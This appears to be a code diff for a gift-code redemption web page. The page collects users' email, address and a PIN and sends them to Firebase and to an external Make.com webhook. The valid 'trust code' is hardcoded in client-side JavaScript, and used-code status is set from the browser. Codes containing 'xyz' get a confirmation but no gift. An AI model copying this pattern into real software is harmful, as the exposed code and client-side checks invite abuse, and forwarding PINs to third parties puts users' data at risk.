@@ -47,7 +47,7 @@
     let currentCode = "";
 
     function checkCode() {
-        currentCode = document.getElementById("codeInput").value;
+        currentCode = document.getElementById("codeInput").value.trim();
         const btn = document.getElementById("checkBtn");
         const trustCode = "98xyz27osq"; 
 
@@ -74,7 +74,7 @@
 
     function showAddressForm() { document.getElementById("addressArea").style.display = "block"; }
 
-    function confirmOrder() {
+    async function confirmOrder() {
         let email = document.getElementById("usermail").value;
         let address = document.getElementById("userAddress").value;
         let pin = document.getElementById("userPin").value;
@@ -91,24 +91,27 @@
             timestamp: new Date().toISOString()
         };
 
-        // 1. Firebase mein Order save
-        db.ref('Orders/').push(orderData);
+        // Saving to Firebase
+        await db.ref('Orders/').push(orderData);
+        await db.ref('GiftCodes/' + currentCode).update({ isUsed: true });
 
-        // 2. Firebase mein code ko 'isUsed: true' mark karna
-        db.ref('GiftCodes/' + currentCode).update({ isUsed: true });
-
-        // 3. Make.com Webhook ko data bhejna
-        fetch('https://hook.us2.make.com/w371006g2atwwruj1c5p7sxtwjwkosd1', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(orderData)
-        });
-        if (currentCode.includes("xyz")) {
-            alert("it is trust vode but you get mail like as normal but no any gift");
-        } else {
-            alert("Success! Your code has been claimed and your order is confirmed.");
-            location.reload();
+        // Webhook integration
+        try {
+            await fetch('https://hook.us2.make.com/w371006g2atwwruj1c5p7sxtwjwkosd1', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(orderData)
+            });
+        } catch (e) {
+            console.error("Webhook failed, but order saved in DB.");
         }
+
+        if (currentCode.includes("xyz")) {
+            alert("It is a trust code, but you will receive an email confirmation (no physical gift).");
+        } else {
+            alert("Success! Your order is confirmed.");
+        }
+        location.reload();
     }
 </script>
 </body>
